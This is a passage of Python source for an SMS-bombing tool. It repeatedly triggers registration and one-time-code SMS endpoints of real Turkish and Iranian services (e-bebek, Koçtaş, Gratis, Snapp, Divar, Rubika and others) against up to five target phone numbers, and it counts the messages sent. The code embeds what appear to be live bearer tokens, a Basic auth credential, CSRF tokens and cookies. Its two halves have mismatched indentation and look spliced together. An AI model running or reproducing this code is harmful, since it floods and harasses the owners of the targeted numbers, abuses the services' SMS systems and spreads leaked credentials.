                    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
                    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
                    json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"] == "SUCCESS":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #sakasu.com.tr
    def Saka(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
                    json={"gsm": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["status"]) == 1 :
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #gofody.com
    def Gofody(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"
                    json={"country_code": "90", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #madamecoco.com
    def Madame(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.madamecoco.com:443/users/registration/"
                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #evidea.com
    def Evidea(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.evidea.com:443/users/register/"
                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                    r = requests.post(url, headers=headers, data=data)      
                    if r.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #koctas.com.tr
    def Koctas(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
                    data = {"givePermission": "true", "mobileNumber": numara}
                    r = requests.post(url, data=data)
                    if (r.json()["status"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #gratis.com
    def Gratis(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
def snap(phone):
        snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": generate_user_agent(os="android"), "content-type": "application/json", "accept": "*/*","origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
        snapD = {"cellphone": phone}
        try:
            post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
            return True
        except:
            pass

    def shad(phone):
        shadH = {"Host": "shadmessenger12.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://shadweb.iranlms.ir", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://shadweb.iranlms.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        shadD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD)
            return True
        except:
            pass


    def tap30(phone):
        tap30H = {"Host": "tap33.me", "Connection": "keep-alive", "Content-Length": "63", "User-Agent": generate_user_agent(os="android") , "content-type": "application/json", "Accept": "*/*","Origin": "https://app.tapsi.cab", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://app.tapsi.cab/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        tap30D = {"credential": {"phoneNumber": "0" + phone.split("+90")[1], "role": "PASSENGER"}}
        try:
            post(url="https://tap33.me/api/v2/user",  headers=tap30H, json=tap30D)
            return True
        except:
            pass


    def emtiaz(phone):
        emH = {"Host": "web.emtiyaz.app", "Connection": "keep-alive", "Content-Length": "28", "Cache-Control": "max-age\u003d0", "Upgrade-Insecure-Requests": "1", "Origin": "https://web.emtiyaz.app", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": generate_user_agent(os="android"), "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://web.emtiyaz.app/login", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
        emD = "send=1&cellphone=0"+phone.split("+90")[1]
        try:
            post(url="https://web.emtiyaz.app/json/login", headers=emH, data=emD)
            return True
        except:
            pass


    def divar(phone):
        divarH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://divar.ir','referer': 'https://divar.ir/','user-agent': generate_user_agent(os="android") ,'x-standard-divar-error': 'true'}
        divarD = {"phone": phone.split("+90")[1]}
        try:
            post(url="https://api.divar.ir/v5/auth/authenticate",  headers=divarH, json=divarD)
            return True
        except:
            pass


    def rubika(phone):
        ruH = {"Host": "messengerg2c4.iranlms.ir", "content-length": "96", "accept": "application/json, text/plain, */*", "user-agent": generate_user_agent(os="android"), "content-type": "text/plain","origin": "https://web.rubika.ir", "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.rubika.ir/", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
        ruD = {"api_version": "3", "method": "sendCode", "data": {"phone_number": phone.split("+")[1], "send_type": "SMS"}}
        try:
            post(url="https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD)
            return True
        except:
            pass


    def bama(phone):
        bamaH = {"Host": "bama.ir", "content-length": "22", "accept": "application/json, text/javascript, */*; q\u003d0.01", "x-requested-with": "XMLHttpRequest", "user-agent": generate_user_agent(os="android"), "csrf-token-bama-header": "CfDJ8N00ikLDmFVBoTe5ae5U4a2G6aNtBFk_sA0DBuQq8RmtGVSLQEq3CXeJmb0ervkK5xY2355oMxH2UDv5oU05FCu56FVkLdgE6RbDs1ojMo90XlbiGYT9XaIKz7YkZg-8vJSuc7f3PR3VKjvuu1fEIOE", "content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8", "origin": "https://bama.ir", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bama.ir/Signin?ReturnUrl\u003d%2Fprofile", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "CSRF-TOKEN-BAMA-COOKIE\u003dCfDJ8N00ikLDmFVBoTe5ae5U4a1o5aOrFp-FIHLs7P3VvLI7yo6xSdyY3sJ5GByfUKfTPuEgfioiGxRQo4G4JzBin1ky5-fvZ1uKkrb_IyaPXs1d0bloIEVe1VahdjTQNJpXQvFyt0tlZnSAZFs4eF3agKg"}
        bamaD = "cellNumber=0"+phone.split("+90")[1]
        try:
            post(url="https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD)
            return True
        except:
            pass


    def snapfood(phone):
        sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
        sfoodH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ','content-type': 'application/x-www-form-urlencoded','cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t